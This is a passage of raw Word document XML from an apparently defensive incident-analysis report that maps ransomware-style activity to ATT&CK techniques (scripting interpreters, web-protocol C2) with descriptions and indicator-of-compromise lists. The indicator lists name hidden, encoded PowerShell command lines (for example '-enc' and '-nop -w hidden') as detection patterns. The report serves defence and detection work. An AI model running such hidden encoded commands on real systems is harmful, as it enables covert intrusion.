      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E862EF"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JavaScript (wscript.exe, cscript.exe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4328627C"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Python, Ruby, and other high-level interpreters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F570BF4"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Visual Basic (VBS), VBA macros</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497298D6" w14:textId="77777777" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Implementations of malicious logic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5E13B2" w14:textId="77777777" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF" w:rsidP="00C449BF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>This technique is often used in combination with:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50267838" w14:textId="77777777" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T1083 – File and Directory Discovery</w:t>
      </w:r>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> (reconnaissance)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDECD0A" w14:textId="77777777" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T1490 – Inhibit System Recovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43731239" w14:textId="35A1F8E0" w:rsidR="00A722B0" w:rsidRPr="00A722B0" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T1486 – Data Encrypted for Impact</w:t>
      </w:r>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> (data encryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DFF27D" w14:textId="77777777" w:rsidR="00C449BF" w:rsidRDefault="00C449BF" w:rsidP="00C449BF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F9769AB" w14:textId="77777777" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF" w:rsidP="00C449BF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52A12407" w14:textId="36488A47" w:rsidR="00F44E1E" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF" w:rsidP="00C449BF">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Why</w:t>
      </w:r>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">used: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Command and scripting interpreters allow adversaries to execute native operating system commands while blending in with legitimate system activity and enabling obfuscation. Scripts also provide a fast and flexible way to automate attack logic, orchestrate multiple stages of an intrusion, and adapt behavior dynamically during execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230E00DA" w14:textId="77777777" w:rsidR="00C449BF" w:rsidRDefault="002B036E" w:rsidP="00F44E1E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F44E1E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>IOC</w:t>
      </w:r>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC1B4E0" w14:textId="0615ED64" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Suspicious process creation (e.g., cmd.exe /c ..., powershell.exe -enc ..., powershell.exe -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -w hidden -command ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B44CAB7" w14:textId="0922A845" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Anomaly signals: Base64-encoded commands (-enc)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4921CA69" w14:textId="784C263B" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Creation of new files (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>decrypt_key.key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, README.txt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305F08C5" w14:textId="214043EE" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Security Onion logs showing FILE_CREATE and FILE_OVERWRITE events</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E03340" w14:textId="2979CC66" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In-memory indicators: presence of cryptographic libraries, obfuscated PowerShell code, and API calls related to process, registry, and file system management</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E4CABC" w14:textId="21D56E16" w:rsidR="00F44E1E" w:rsidRDefault="002B036E" w:rsidP="00F44E1E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A722B0" w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13ED0B20" wp14:editId="1A9BB1C1">
            <wp:extent cx="5486400" cy="8616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861695"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF22115" w14:textId="77777777" w:rsidR="00A722B0" w:rsidRDefault="00A722B0" w:rsidP="00F44E1E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="547367A3" w14:textId="77777777" w:rsidR="00A722B0" w:rsidRDefault="00A722B0" w:rsidP="00F44E1E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B490F11" w14:textId="77777777" w:rsidR="00A722B0" w:rsidRPr="00C449BF" w:rsidRDefault="00A722B0" w:rsidP="00F44E1E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="402ADFE4" w14:textId="13E698AA" w:rsidR="005F602B" w:rsidRPr="005F602B" w:rsidRDefault="005F602B" w:rsidP="005F602B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F602B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-KZ"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>C2 Communication</w:t>
      </w:r>
      <w:r w:rsidRPr="005F602B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DFFC8B" w14:textId="69316080" w:rsidR="00236ACA" w:rsidRDefault="00236ACA" w:rsidP="00C122FD">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00236ACA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Application Layer Protocol: Web Protocols</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidRPr="00236ACA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>T1071.001</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D615BC" w14:textId="7BA27D11" w:rsidR="00204E24" w:rsidRDefault="00C122FD" w:rsidP="00C122FD">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Description: </w:t>
      </w:r>
      <w:r w:rsidR="00236ACA" w:rsidRPr="00236ACA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This technique involves adversaries using common web-based application layer protocols to communicate with command-and-control (C2) infrastructure. By embedding commands and responses within standard web traffic, attackers can blend malicious communications with legitimate network activity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1329AA" w14:textId="330C1799" w:rsidR="00C122FD" w:rsidRDefault="00C122FD" w:rsidP="00C122FD">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Why it’s used: </w:t>
      </w:r>
      <w:r w:rsidR="00236ACA" w:rsidRPr="00236ACA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Web protocols such as HTTP and HTTPS are widely allowed through network security controls, making them effective for evading detection and bypassing filtering mechanisms. The structure of these protocols provides multiple fields and headers that can be abused to conceal command data, enabling reliable and covert communication between compromised systems and attacker-controlled servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102848FA" w14:textId="77777777" w:rsidR="00C122FD" w:rsidRDefault="00C122FD" w:rsidP="00C122FD">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AECEA5B" w14:textId="30322E55" w:rsidR="00C122FD" w:rsidRDefault="00C122FD" w:rsidP="00C122FD">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>IOC:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21696E9B" w14:textId="22201815" w:rsidR="00236ACA" w:rsidRPr="006518E5" w:rsidRDefault="00236ACA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Periodic or beacon-like HTTP/HTTPS requests to unusual or newly registered domains</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C503C7" w14:textId="040B59A3" w:rsidR="00236ACA" w:rsidRPr="006518E5" w:rsidRDefault="00236ACA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Abnormal HTTP headers, encoded payloads, or inconsistent user-agent strings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752ED077" w14:textId="7BD70B5A" w:rsidR="00236ACA" w:rsidRPr="006518E5" w:rsidRDefault="00236ACA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Encrypted outbound traffic to non-standard or suspicious destinations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20006A01" w14:textId="3216BD82" w:rsidR="00236ACA" w:rsidRDefault="00236ACA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Network connections that resemble web traffic but lack corresponding user activity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F08B29" w14:textId="7AE5BA15" w:rsidR="00A722B0" w:rsidRDefault="00A722B0" w:rsidP="00A722B0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A20A5C6" wp14:editId="054EF713">
            <wp:extent cx="5486400" cy="889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889000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BA6ECD" w14:textId="77777777" w:rsidR="00A722B0" w:rsidRPr="00A722B0" w:rsidRDefault="00A722B0" w:rsidP="00A722B0">
      <w:pPr>
        <w:rPr>
